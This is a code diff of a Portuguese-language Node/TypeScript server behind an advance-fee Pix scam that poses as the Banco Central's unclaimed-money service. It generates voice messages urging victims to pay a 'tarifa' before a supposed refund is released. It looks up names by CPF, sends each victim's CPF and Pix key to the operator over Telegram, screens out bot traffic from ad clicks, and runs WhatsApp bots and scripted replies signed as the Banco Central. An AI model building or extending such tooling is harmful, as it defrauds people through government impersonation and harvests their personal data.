@@ -535,7 +535,7 @@ app.get("/api/v1/attendants", (req, res) => {
 });
 
 app.get("/api/config", (req, res) => {
-  res.json({ 
+  res.json({
     whatsappNumber: currentConfig.whatsappNumber,
     tarifaTransicional: currentConfig.tarifaTransicional || 2.99
   });
@@ -545,14 +545,14 @@ app.get("/api/config", (req, res) => {
 app.post("/api/v1/tts", async (req, res) => {
   const { name, attendantName, voiceId, value } = req.body;
   if (!name) return res.status(400).json({ error: "Nome não fornecido" });
-  
+
   const firstName = name.split(" ")[0] || "Cidadão";
   const atendente = attendantName || "Assistente";
   const idVoz = voiceId || "GM2UA3fbsIaLHcswCDX9";
   const valorTexto = value ? `no valor de ${value}` : "";
-  
+
   const script = `Oi, ${firstName}! Que bom que você chegou até aqui. Eu sou a ${atendente} e o seu processo de resgate ${valorTexto} deu super certo. Pra gente conseguir liberar esse PIX direto na sua conta do Banco Central agora mesmo, você só precisa pagar uma tarifa unificada rapidinho. Não se preocupe, isso é só uma segurança padrão contra fraudes. Assim que compensar no sistema, o valor total do seu resgate cai na sua conta em uns dois minutinhos. Clica no botão aqui embaixo e finaliza seu saque!`;
-  
+
   try {
     const apiKey = process.env.ELEVENLABS_API_KEY || "";
     if (!apiKey) throw new Error("Chave ElevenLabs não configurada no .env");
@@ -572,7 +572,7 @@ app.post("/api/v1/tts", async (req, res) => {
         responseType: 'arraybuffer' // Essencial para converter em Base64
       }
     );
-    
+
     const audioContent = Buffer.from(response.data).toString('base64');
     res.json({ success: true, audioBase64: audioContent });
   } catch (err: any) {
@@ -589,25 +589,25 @@ app.post("/api/v1/buypix/create", async (req, res) => {
   try {
     const buyPixKey = process.env.BUYPIX_API_KEY || 'bpx_live_fake_key_for_testing'; // Fallback
     const transId = Math.random().toString(36).substring(7).toUpperCase();
-    
+
     // Simulate or Call BuyPix
     // Se não tiver chave real, a gente simula para o fluxo funcionar
     if (buyPixKey === 'bpx_live_fake_key_for_testing') {
-        const fakePixCode = "00020126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865404" + amount.toFixed(2) + "5802BR5913Test Receiver6008BRASILIA62070503***6304ABCD";
-        const qrBuffer = await QRCode.toDataURL(fakePixCode);
-        buyPixStatus.set(transId, 'pending');
-        
-        // Simular pagamento em 20 segundos para fins de teste se o admin quiser
-        // setTimeout(() => buyPixStatus.set(transId, 'completed'), 20000);
-        
-        return res.json({
-          success: true,
-          data: {
-             id: transId,
-             pix_qr_code: fakePixCode,
-             pix_qr_code_base64: qrBuffer
-          }
-        });
+      const fakePixCode = "00020126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865404" + amount.toFixed(2) + "5802BR5913Test Receiver6008BRASILIA62070503***6304ABCD";
+      const qrBuffer = await QRCode.toDataURL(fakePixCode);
+      buyPixStatus.set(transId, 'pending');
+
+      // Simular pagamento em 20 segundos para fins de teste se o admin quiser
+      // setTimeout(() => buyPixStatus.set(transId, 'completed'), 20000);
+
+      return res.json({
+        success: true,
+        data: {
+          id: transId,
+          pix_qr_code: fakePixCode,
+          pix_qr_code_base64: qrBuffer
+        }
+      });
     }
 
     const payload = {
@@ -638,22 +638,22 @@ app.post("/api/v1/telemetry/chat", async (req, res) => {
   try {
     const { action, leadName, cpf, pix, value } = req.body;
     let msg = "";
-    switch(action) {
-       case "entered":
-          msg = `🟢 <b>NOVO LEAD NO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n<b>Valor a Receber:</b> ${value || 'Desconhecido'}\n\nO Lead acabou de entrar na tela de conversa.`;
-          break;
-       case "left":
-          msg = `🔴 <b>LEAD SAIU DO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n\nO Lead abandonou a página do chat.`;
-          break;
-       case "generated_payment":
-          msg = `🟡 <b>PAGAMENTO GERADO!</b>\n\n<b>Nome:</b> ${leadName}\n<b>Chave PIX:</b> ${pix}\n<b>Valor do Saque:</b> ${value}\n\nO Lead chegou no final do chat e a guia de pagamento da tarifa foi gerada!`;
-          break;
-       case "whatsapp":
-          msg = `📱 <b>LEAD FOI PRO WHATSAPP!</b>\n\n<b>Nome:</b> ${leadName}\n<b>CPF:</b> ${cpf}\n\nO Lead clicou no botão para continuar pelo WhatsApp.`;
-          break;
+    switch (action) {
+      case "entered":
+        msg = `🟢 <b>NOVO LEAD NO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n<b>Valor a Receber:</b> ${value || 'Desconhecido'}\n\nO Lead acabou de entrar na tela de conversa.`;
+        break;
+      case "left":
+        msg = `🔴 <b>LEAD SAIU DO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n\nO Lead abandonou a página do chat.`;
+        break;
+      case "generated_payment":
+        msg = `🟡 <b>PAGAMENTO GERADO!</b>\n\n<b>Nome:</b> ${leadName}\n<b>Chave PIX:</b> ${pix}\n<b>Valor do Saque:</b> ${value}\n\nO Lead chegou no final do chat e a guia de pagamento da tarifa foi gerada!`;
+        break;
+      case "whatsapp":
+        msg = `📱 <b>LEAD FOI PRO WHATSAPP!</b>\n\n<b>Nome:</b> ${leadName}\n<b>CPF:</b> ${cpf}\n\nO Lead clicou no botão para continuar pelo WhatsApp.`;
+        break;
     }
     if (msg) {
-       await sendTelegram(msg);
+      await sendTelegram(msg);
     }
     res.json({ success: true });
   } catch (err) {
@@ -667,16 +667,16 @@ app.post("/api/v1/buypix/webhook", async (req, res) => {
     if (event === 'deposit.completed') {
       const depositId = data?.id;
       if (depositId) {
-         buyPixStatus.set(depositId, 'completed');
-         console.log(`💰 [BUYPIX] Pagamento Confirmado! ID: ${depositId}`);
-         await sendTelegram(`✅ <b>PAGAMENTO DA TARIFA CONFIRMADO!</b>\n\n<b>ID:</b> ${depositId}\n\nO Lead pagou a tarifa via PIX! 🎉`);
+        buyPixStatus.set(depositId, 'completed');
+        console.log(`💰 [BUYPIX] Pagamento Confirmado! ID: ${depositId}`);
+        await sendTelegram(`✅ <b>PAGAMENTO DA TARIFA CONFIRMADO!</b>\n\n<b>ID:</b> ${depositId}\n\nO Lead pagou a tarifa via PIX! 🎉`);
       }
     } else if (event === 'deposit.expired' || event === 'deposit.canceled') {
       const depositId = data?.id;
       if (depositId) {
-         buyPixStatus.set(depositId, 'expired');
-         console.log(`❌ [BUYPIX] Pagamento Expirado! ID: ${depositId}`);
-         await sendTelegram(`❌ <b>PAGAMENTO EXPIRADO!</b>\n\n<b>ID:</b> ${depositId}\n\nO tempo para pagamento da tarifa via PIX se esgotou ou foi cancelado.`);
+        buyPixStatus.set(depositId, 'expired');
+        console.log(`❌ [BUYPIX] Pagamento Expirado! ID: ${depositId}`);
+        await sendTelegram(`❌ <b>PAGAMENTO EXPIRADO!</b>\n\n<b>ID:</b> ${depositId}\n\nO tempo para pagamento da tarifa via PIX se esgotou ou foi cancelado.`);
       }
     }
     res.json({ success: true });
@@ -686,8 +686,8 @@ app.post("/api/v1/buypix/webhook", async (req, res) => {
 });
 
 app.get("/api/v1/buypix/status/:id", (req, res) => {
-   const status = buyPixStatus.get(req.params.id) || 'pending';
-   res.json({ status });
+  const status = buyPixStatus.get(req.params.id) || 'pending';
+  res.json({ status });
 });
 
 app.post("/api/v1/validate/document", async (req, res) => {
@@ -697,11 +697,11 @@ app.post("/api/v1/validate/document", async (req, res) => {
   try {
     const apiKey = process.env.INFOSEEK_API_KEY || "";
     const cleanDoc = docValue.replace(/\D/g, "");
-    
+
     // Determine the correct endpoint based on document length/type
     const isCnpj = cleanDoc.length > 11 || docType === "CNPJ";
-    const endpoint = isCnpj 
-      ? "https://api.infoseekdata.com.br/api/validate/cnpj" 
+    const endpoint = isCnpj
+      ? "https://api.infoseekdata.com.br/api/validate/cnpj"
       : "https://api.infoseekdata.com.br/api/validate/cpf";
 
     const response = await axios.post(
@@ -720,13 +720,13 @@ app.post("/api/v1/validate/document", async (req, res) => {
     console.log("Infoseek response:", JSON.stringify(responseData));
 
     // A API pode retornar o nome em diferentes campos dependendo se é CPF ou CNPJ
-    const name = responseData.data?.name || 
-                 responseData.data?.nome || 
-                 responseData.data?.Nome || 
-                 responseData.data?.razao_social ||
-                 responseData.name || 
-                 "Cidadão";
-    
+    const name = responseData.data?.name ||
+      responseData.data?.nome ||
+      responseData.data?.Nome ||
+      responseData.data?.razao_social ||
+      responseData.name ||
+      "Cidadão";
+
     res.json({ success: true, name });
   } catch (err: any) {
     console.error("Infoseek API Error:", err.response?.data || err.message);
@@ -1105,7 +1105,7 @@ function resetBotSession(id: string) {
         // Marca como desconectado para o watchdog não interferir
         fs.writeFileSync(statusFile, JSON.stringify({ status: 'DISCONNECTED', ts: Date.now() }));
       }
-      
+
       console.log(`✅ [SISTEMA] Sessão ${id} limpa com sucesso. Reiniciando robô...`);
       startBot(id, 2000);
     } catch (e: any) {
@@ -1211,7 +1211,7 @@ app.use((req, res, next) => {
   // Se o dispositivo não for um robô classificado acima, consideramos orgânico/lead real.
   // Já não bloqueamos por ausência de "Mobile" ou "Android" para evitar falsos positivos
   // em navegadores seguros (proxies, in-app browsers estranhos).
-  
+
   if (fbclid || referer.includes('facebook') || referer.includes('instagram')) {
     console.log(`🎯 [LEAD] Tráfego de anúncio liberado: ${ua.substring(0, 40)}...`);
   }
@@ -1229,7 +1229,7 @@ async function sendTelegramChatAction(action: string = 'typing') {
   if (!TG_TOKEN || !CHAT_ID) return;
   try {
     await axios.post(`${TELEGRAM_URL}/sendChatAction`, { chat_id: CHAT_ID, action });
-  } catch (e) {}
+  } catch (e) { }
 }
 
 async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
@@ -1269,8 +1269,8 @@ async function sendTelegram(text: string, messageId?: number, replyMarkup?: any)
       // Remove os botões da foto original para não ser clicada novamente
       try {
         await axios.post(`${TELEGRAM_URL}/editMessageReplyMarkup`, { chat_id: CHAT_ID, message_id: messageId, reply_markup: { inline_keyboard: [] } });
-      } catch(e) {}
-      
+      } catch (e) { }
+
       // Envia a nova mensagem normalmente embaixo
       return sendTelegram(text, undefined, replyMarkup);
     }
@@ -1310,7 +1310,7 @@ async function deleteTelegramMessage(messageId: number) {
   if (!TG_TOKEN || !CHAT_ID || !messageId) return;
   try {
     await axios.post(`${TELEGRAM_URL}/deleteMessage`, { chat_id: CHAT_ID, message_id: messageId });
-  } catch (e) {}
+  } catch (e) { }
 }
 
 function escapeHtml(text: string | undefined | null) {
@@ -1454,7 +1454,7 @@ async function startTelegramPolling() {
 
         // Feedback visual no Telegram (Loading no topo)
         if (cb) await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id });
-        
+
         // Simular digitação e tempo de resposta para qualquer ação no painel
         await sendTelegramChatAction('typing');
         await new Promise(resolve => setTimeout(resolve, 800));
@@ -1495,14 +1495,14 @@ async function startTelegramPolling() {
 
           let isAiEnabled = true;
           if (fs.existsSync('ai-status.json')) {
-              try { isAiEnabled = JSON.parse(fs.readFileSync('ai-status.json', 'utf-8')).aiEnabled !== false; } catch (e) {}
+            try { isAiEnabled = JSON.parse(fs.readFileSync('ai-status.json', 'utf-8')).aiEnabled !== false; } catch (e) { }
           }
           const aiBtnText = isAiEnabled ? "🧠 Desativar IA Automática" : "🧠 Ativar IA Automática";
           const aiStatusStr = isAiEnabled ? "✅ LIGADA" : "❌ DESLIGADA";
 
           let isBotManual = false;
           if (fs.existsSync('bot-status-main.json')) {
-              try { isBotManual = JSON.parse(fs.readFileSync('bot-status-main.json', 'utf-8')).status === 'MANUAL'; } catch (e) {}
+            try { isBotManual = JSON.parse(fs.readFileSync('bot-status-main.json', 'utf-8')).status === 'MANUAL'; } catch (e) { }
           }
           const botModeStr = isBotManual ? "👤 MANUAL" : "🤖 AUTOMÁTICO";
           const botModeBtnText = isBotManual ? "🤖 Ligar Modo Auto" : "👤 Ligar Modo Manual";
@@ -1553,39 +1553,39 @@ async function startTelegramPolling() {
               saveConfig();
               await sendTelegram(`✅ Tarifa Transicional alterada para R$ ${val.toFixed(2)}`, msgId);
             } else {
-               await sendTelegram(`❌ Valor inválido. Use /set_taxa 3.50`, msgId);
+              await sendTelegram(`❌ Valor inválido. Use /set_taxa 3.50`, msgId);
             }
           } else {
-             await sendTelegram(`❌ Uso correto: /set_taxa 3.50`, msgId);
+            await sendTelegram(`❌ Uso correto: /set_taxa 3.50`, msgId);
           }
         }
         else if (text === "painel:toggle_ai") {
-           let isAiEnabled = true;
-           if (fs.existsSync('ai-status.json')) {
-               try { isAiEnabled = JSON.parse(fs.readFileSync('ai-status.json', 'utf-8')).aiEnabled !== false; } catch (e) {}
-           }
-           isAiEnabled = !isAiEnabled;
-           fs.writeFileSync('ai-status.json', JSON.stringify({ aiEnabled: isAiEnabled }));
-           
-           await sendTelegram(`🧠 <b>IA AUTOMÁTICA ${isAiEnabled ? 'LIGADA' : 'DESLIGADA'}!</b>\n\n${isAiEnabled ? 'O bot voltará a processar as mensagens recebidas.' : 'O bot não enviará mensagens sozinho (mas ainda registrará os contatos).'}`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:start" }]] });
+          let isAiEnabled = true;
+          if (fs.existsSync('ai-status.json')) {
+            try { isAiEnabled = JSON.parse(fs.readFileSync('ai-status.json', 'utf-8')).aiEnabled !== false; } catch (e) { }
+          }
+          isAiEnabled = !isAiEnabled;
+          fs.writeFileSync('ai-status.json', JSON.stringify({ aiEnabled: isAiEnabled }));
+
+          await sendTelegram(`🧠 <b>IA AUTOMÁTICA ${isAiEnabled ? 'LIGADA' : 'DESLIGADA'}!</b>\n\n${isAiEnabled ? 'O bot voltará a processar as mensagens recebidas.' : 'O bot não enviará mensagens sozinho (mas ainda registrará os contatos).'}`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:start" }]] });
         }
         else if (text === "painel:toggle_bot_mode") {
-           let isBotManual = false;
-           const statusPath = path.join(process.cwd(), 'bot-status-main.json');
-           if (fs.existsSync(statusPath)) {
-               try { isBotManual = JSON.parse(fs.readFileSync(statusPath, 'utf-8')).status === 'MANUAL'; } catch (e) {}
-           }
-           if (isBotManual) {
-               // Estava manual, vamos para automático:
-               fs.writeFileSync(statusPath, JSON.stringify({ status: 'DISCONNECTED', ts: Date.now() }));
-               await sendTelegram(`🤖 <b>MODO AUTOMÁTICO LIGADO</b>\n\nIniciando o navegador para o WhatsApp Main... (Aguarde a geração do QR Code)`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:start" }]] });
-               startBot('main');
-           } else {
-               // Estava automático, vamos para manual:
-               fs.writeFileSync(statusPath, JSON.stringify({ status: 'MANUAL', ts: Date.now() }));
-               stopBot('main');
-               await sendTelegram(`👤 <b>MODO MANUAL LIGADO</b>\n\nO robô principal foi desconectado e parado.\nAtendimentos agora dependem exclusivamente do seu WhatsApp Oficial.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:start" }]] });
-           }
+          let isBotManual = false;
+          const statusPath = path.join(process.cwd(), 'bot-status-main.json');
+          if (fs.existsSync(statusPath)) {
+            try { isBotManual = JSON.parse(fs.readFileSync(statusPath, 'utf-8')).status === 'MANUAL'; } catch (e) { }
+          }
+          if (isBotManual) {
+            // Estava manual, vamos para automático:
+            fs.writeFileSync(statusPath, JSON.stringify({ status: 'DISCONNECTED', ts: Date.now() }));
+            await sendTelegram(`🤖 <b>MODO AUTOMÁTICO LIGADO</b>\n\nIniciando o navegador para o WhatsApp Main... (Aguarde a geração do QR Code)`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:start" }]] });
+            startBot('main');
+          } else {
+            // Estava automático, vamos para manual:
+            fs.writeFileSync(statusPath, JSON.stringify({ status: 'MANUAL', ts: Date.now() }));
+            stopBot('main');
+            await sendTelegram(`👤 <b>MODO MANUAL LIGADO</b>\n\nO robô principal foi desconectado e parado.\nAtendimentos agora dependem exclusivamente do seu WhatsApp Oficial.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:start" }]] });
+          }
         }
         else if (text === "painel:status") {
           // Conta atendentes REALMENTE conectados (bots com status CONNECTED)
@@ -1649,7 +1649,7 @@ async function startTelegramPolling() {
           const txt = `📜 <b>ROTEIROS DE ATENDIMENTO MANUAL</b>\n` +
             (chatId !== "Geral" ? `Lead: <code>${chatId}</code>\n\n` : `\n`) +
             `Escolha qual parte do roteiro deseja copiar:`;
-            
+
           const kb = {
             inline_keyboard: [
               [
@@ -1683,10 +1683,10 @@ async function startTelegramPolling() {
           const parts = cb.data.split(":");
           const scriptId = parts[1];
           const chatId = parts[2];
-          
+
           let scriptContent = "";
           let title = "";
-          
+
           if (scriptId === "e1") {
             title = "👋 ETAPA 1 (Data de Nascimento/Abertura)";
             scriptContent = `<b>Pessoa Física (CPF):</b>\n` +
@@ -1804,7 +1804,7 @@ async function startTelegramPolling() {
               `*Portal de Valores — Banco Central do Brasil*\n` +
               `_Processo 100% Homologado e Finalizado._</code>`;
           }
-          
+
           const finalTxt = `<b>${title}</b>\n\n${scriptContent}`;
           await sendTelegram(finalTxt, undefined, {
             inline_keyboard: [[{ text: "⬅️ Voltar aos Roteiros", callback_data: `painel:scripts:${chatId}` }]]
@@ -1976,14 +1976,14 @@ async function startTelegramPolling() {
         else if (text === "painel:config_banners") {
           const checkFile = (f: string) => fs.existsSync(path.join(process.cwd(), 'public', 'assets', 'banners', f)) ? '✅' : '❌';
           const kb = {
-             inline_keyboard: [
-                [{ text: `Banner 1 (Saque Aprovado) [${checkFile('banner_saque_aprovado.png')}]`, callback_data: "painel:edit_banner:saque" }],
-                [{ text: `Banner 2 (Atenção) [${checkFile('banner_atencao.png')}]`, callback_data: "painel:edit_banner:atencao" }],
-                [{ text: `Banner 3 (Pix) [${checkFile('banner_pix.png')}]`, callback_data: "painel:edit_banner:pix" }],
-                [{ text: `Avatar do Bot [${checkFile('bot_avatar.png')}]`, callback_data: "painel:edit_banner:avatar" }],
-                [{ text: `Vídeo Explicativo [${checkFile('video_explicacao.mp4')}]`, callback_data: "painel:edit_banner:video" }],
-                [{ text: "↩️ Voltar ao Painel", callback_data: "painel:start" }]
-             ]
+            inline_keyboard: [
+              [{ text: `Banner 1 (Saque Aprovado) [${checkFile('banner_saque_aprovado.png')}]`, callback_data: "painel:edit_banner:saque" }],
+              [{ text: `Banner 2 (Atenção) [${checkFile('banner_atencao.png')}]`, callback_data: "painel:edit_banner:atencao" }],
+              [{ text: `Banner 3 (Pix) [${checkFile('banner_pix.png')}]`, callback_data: "painel:edit_banner:pix" }],
+              [{ text: `Avatar do Bot [${checkFile('bot_avatar.png')}]`, callback_data: "painel:edit_banner:avatar" }],
+              [{ text: `Vídeo Explicativo [${checkFile('video_explicacao.mp4')}]`, callback_data: "painel:edit_banner:video" }],
+              [{ text: "↩️ Voltar ao Painel", callback_data: "painel:start" }]
+            ]
           };
           await sendTelegram(`🖼️ <b>EDITAR BANNERS DO CHAT</b>\n\nEscolha qual banner ou vídeo deseja alterar enviando uma nova imagem ou vídeo:`, msgId, kb);
         }
@@ -2233,8 +2233,8 @@ async function startTelegramPolling() {
         else if (text === "change_num:only_change" || text === "change_num:connect") {
           const state = botStates.get(userId);
           if (!state || state.action !== 'awaiting_whatsapp_new_number_confirm') {
-              await sendTelegram(`❌ Sessão expirada.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:back" }]] });
-              return;
+            await sendTelegram(`❌ Sessão expirada.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:back" }]] });
+            return;
           }
           const { newNumber, slotId } = state.data;
           currentConfig.whatsappNumber = newNumber;
@@ -2242,24 +2242,24 @@ async function startTelegramPolling() {
           botStates.delete(userId);
 
           if (text === "change_num:only_change") {
-              await sendTelegram(`✅ <b>NÚMERO ATUALIZADO!</b>\n\nO novo número (${newNumber}) foi salvo apenas no sistema.\nNenhum QR Code será gerado agora.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:back" }]] });
+            await sendTelegram(`✅ <b>NÚMERO ATUALIZADO!</b>\n\nO novo número (${newNumber}) foi salvo apenas no sistema.\nNenhum QR Code será gerado agora.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:back" }]] });
           } else {
-              await sendTelegram(`✅ <b>NÚMERO ATUALIZADO!</b>\n\nO novo número (${newNumber}) foi salvo e o slot <b>${slotId}</b> será reiniciado para gerar um novo QR Code.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:back" }]] });
-              resetBotSession(slotId);
+            await sendTelegram(`✅ <b>NÚMERO ATUALIZADO!</b>\n\nO novo número (${newNumber}) foi salvo e o slot <b>${slotId}</b> será reiniciado para gerar um novo QR Code.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:back" }]] });
+            resetBotSession(slotId);
           }
         }
         else if (text === "boot:manual") {
-           fs.writeFileSync('bot-status-main.json', JSON.stringify({ status: 'MANUAL', ts: Date.now() }));
-           await sendTelegram(`👤 <b>MODO MANUAL ATIVADO</b>\n\nO bot do WhatsApp não será conectado pela IA. O sistema registrará os leads no painel e você deverá realizar os atendimentos pelo seu aplicativo oficial do WhatsApp.`, msgId, { inline_keyboard: [[{ text: "🏠 Painel Principal", callback_data: "painel:start" }]] });
+          fs.writeFileSync('bot-status-main.json', JSON.stringify({ status: 'MANUAL', ts: Date.now() }));
+          await sendTelegram(`👤 <b>MODO MANUAL ATIVADO</b>\n\nO bot do WhatsApp não será conectado pela IA. O sistema registrará os leads no painel e você deverá realizar os atendimentos pelo seu aplicativo oficial do WhatsApp.`, msgId, { inline_keyboard: [[{ text: "🏠 Painel Principal", callback_data: "painel:start" }]] });
         }
         else if (text === "boot:auto") {
-           if (!currentConfig.whatsappNumber || currentConfig.whatsappNumber.length < 12 || currentConfig.whatsappNumber === "5511971730325") {
-               botStates.set(userId, { action: 'awaiting_whatsapp_new_number', data: { slotId: 'main', botMsgId: msgId } });
-               await sendTelegram(`🤖 <b>ATENDIMENTO AUTOMÁTICO</b>\n\nO número do WhatsApp não está configurado. Por favor, digite o número (com DDI e DDD, ex: 5511999999999):`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
-           } else {
-               startBot('main');
-               await sendTelegram(`🤖 <b>INICIANDO BOT (Automático)...</b>\n\nAguarde, o sistema está gerando o QR Code de acesso para o número <code>+${currentConfig.whatsappNumber}</code>.`, msgId);
-           }
+          if (!currentConfig.whatsappNumber || currentConfig.whatsappNumber.length < 12 || currentConfig.whatsappNumber === "5511971730325") {
+            botStates.set(userId, { action: 'awaiting_whatsapp_new_number', data: { slotId: 'main', botMsgId: msgId } });
+            await sendTelegram(`🤖 <b>ATENDIMENTO AUTOMÁTICO</b>\n\nO número do WhatsApp não está configurado. Por favor, digite o número (com DDI e DDD, ex: 5511999999999):`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
+          } else {
+            startBot('main');
+            await sendTelegram(`🤖 <b>INICIANDO BOT (Automático)...</b>\n\nAguarde, o sistema está gerando o QR Code de acesso para o número <code>+${currentConfig.whatsappNumber}</code>.`, msgId);
+          }
         }
         else if (text.startsWith("pix_dest:")) {
           const parts = text.split(":");
@@ -2284,58 +2284,58 @@ async function startTelegramPolling() {
           }
         }
         else if (!cb && (msg?.photo || msg?.video)) {
-           const state = botStates.get(userId);
-           if (state?.action?.startsWith('awaiting_banner_')) {
-              const bannerId = state.action.replace('awaiting_banner_', '');
-              
-              if (bannerId === "video" && !msg.video) {
-                 await sendTelegram(`❌ <b>MÍDIA INVÁLIDA</b>\n\nPor favor, envie um arquivo de vídeo (MP4) de até 20MB.`, state.data?.botMsgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_banners" }]] });
-                 return;
-              }
-              if (bannerId !== "video" && !msg.photo) {
-                 await sendTelegram(`❌ <b>MÍDIA INVÁLIDA</b>\n\nPor favor, envie uma foto/imagem compactada.`, state.data?.botMsgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_banners" }]] });
-                 return;
+          const state = botStates.get(userId);
+          if (state?.action?.startsWith('awaiting_banner_')) {
+            const bannerId = state.action.replace('awaiting_banner_', '');
+
+            if (bannerId === "video" && !msg.video) {
+              await sendTelegram(`❌ <b>MÍDIA INVÁLIDA</b>\n\nPor favor, envie um arquivo de vídeo (MP4) de até 20MB.`, state.data?.botMsgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_banners" }]] });
+              return;
+            }
+            if (bannerId !== "video" && !msg.photo) {
+              await sendTelegram(`❌ <b>MÍDIA INVÁLIDA</b>\n\nPor favor, envie uma foto/imagem compactada.`, state.data?.botMsgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_banners" }]] });
+              return;
+            }
+
+            const fileId = msg.video ? msg.video.file_id : msg.photo[msg.photo.length - 1].file_id;
+            const targetMsgId = state.data?.botMsgId;
+
+            try {
+              const fileRes = await axios.get(`https://api.telegram.org/bot${TG_TOKEN}/getFile?file_id=${fileId}`);
+              const filePath = fileRes.data.result.file_path;
+              const downloadRes = await axios.get(`https://api.telegram.org/file/bot${TG_TOKEN}/${filePath}`, { responseType: 'arraybuffer' });
+
+              let filename = "meu_govbr.png";
+              if (bannerId === "saque") filename = "banner_saque_aprovado.png";
+              if (bannerId === "atencao") filename = "banner_atencao.png";
+              if (bannerId === "pix") filename = "banner_pix.png";
+              if (bannerId === "avatar") filename = "bot_avatar.png";
+              if (bannerId === "video") filename = "video_explicacao.mp4";
+
+              const savePathPublic = path.join(process.cwd(), 'public', 'assets', 'banners', filename);
+              const savePathDist = path.join(process.cwd(), 'dist', 'assets', 'banners', filename);
+
+              // Salvar em ambas as pastas para atualizar na hora (dist) e persistir em novos builds (public)
+              fs.writeFileSync(savePathPublic, downloadRes.data);
+              if (fs.existsSync(path.dirname(savePathDist))) {
+                fs.writeFileSync(savePathDist, downloadRes.data);
               }
 
-              const fileId = msg.video ? msg.video.file_id : msg.photo[msg.photo.length - 1].file_id;
-              const targetMsgId = state.data?.botMsgId;
-              
-              try {
-                 const fileRes = await axios.get(`https://api.telegram.org/bot${TG_TOKEN}/getFile?file_id=${fileId}`);
-                 const filePath = fileRes.data.result.file_path;
-                 const downloadRes = await axios.get(`https://api.telegram.org/file/bot${TG_TOKEN}/${filePath}`, { responseType: 'arraybuffer' });
-                 
-                 let filename = "meu_govbr.png";
-                 if (bannerId === "saque") filename = "banner_saque_aprovado.png";
-                 if (bannerId === "atencao") filename = "banner_atencao.png";
-                 if (bannerId === "pix") filename = "banner_pix.png";
-                 if (bannerId === "avatar") filename = "bot_avatar.png";
-                 if (bannerId === "video") filename = "video_explicacao.mp4";
-                 
-                 const savePathPublic = path.join(process.cwd(), 'public', 'assets', 'banners', filename);
-                 const savePathDist = path.join(process.cwd(), 'dist', 'assets', 'banners', filename);
-                 
-                 // Salvar em ambas as pastas para atualizar na hora (dist) e persistir em novos builds (public)
-                 fs.writeFileSync(savePathPublic, downloadRes.data);
-                 if (fs.existsSync(path.dirname(savePathDist))) {
-                     fs.writeFileSync(savePathDist, downloadRes.data);
-                 }
-                 
-                 await deleteTelegramMessage(msgId);
-                 await sendTelegram(`✅ <b>BANNER ATUALIZADO COM SUCESSO!</b>\n\nA imagem foi processada e salva.`, targetMsgId, { inline_keyboard: [[{ text: "↩️ Menu Principal", callback_data: "painel:start" }]] });
-                 botStates.delete(userId);
-              } catch (e: any) {
-                 await deleteTelegramMessage(msgId);
-                 await sendTelegram(`❌ <b>ERRO AO SALVAR IMAGEM</b>\n\n${e.message}`, targetMsgId, { inline_keyboard: [[{ text: "↩️ Menu Principal", callback_data: "painel:start" }]] });
-              }
-           }
+              await deleteTelegramMessage(msgId);
+              await sendTelegram(`✅ <b>BANNER ATUALIZADO COM SUCESSO!</b>\n\nA imagem foi processada e salva.`, targetMsgId, { inline_keyboard: [[{ text: "↩️ Menu Principal", callback_data: "painel:start" }]] });
+              botStates.delete(userId);
+            } catch (e: any) {
+              await deleteTelegramMessage(msgId);
+              await sendTelegram(`❌ <b>ERRO AO SALVAR IMAGEM</b>\n\n${e.message}`, targetMsgId, { inline_keyboard: [[{ text: "↩️ Menu Principal", callback_data: "painel:start" }]] });
+            }
+          }
         }
         else if (!cb && msg?.text) {
           const state = botStates.get(userId);
           const targetMsgId = state?.data?.botMsgId || msgId;
 
           if (state?.data?.botMsgId) {
-             deleteTelegramMessage(msgId);
+            deleteTelegramMessage(msgId);
           }
 
           if (state?.action?.startsWith('awaiting_pix_edit_')) {
@@ -2431,16 +2431,16 @@ async function startTelegramPolling() {
               await sendTelegram(`❌ <b>NÚMERO INVÁLIDO</b>\n\nDigite um número válido com DDI e DDD (ex: 5511999999999).`, targetMsgId);
               return;
             }
-            
+
             const slotId = state.data?.slotId || 'main';
             botStates.set(userId, { action: 'awaiting_whatsapp_new_number_confirm', data: { newNumber, slotId, botMsgId: targetMsgId } });
-            
+
             await sendTelegram(`📱 <b>NOVO NÚMERO DEFINIDO:</b> ${newNumber}\n\nO que você deseja fazer agora?`, targetMsgId, {
-                inline_keyboard: [
-                    [{ text: "🔄 Apenas Trocar no Sistema", callback_data: "change_num:only_change" }],
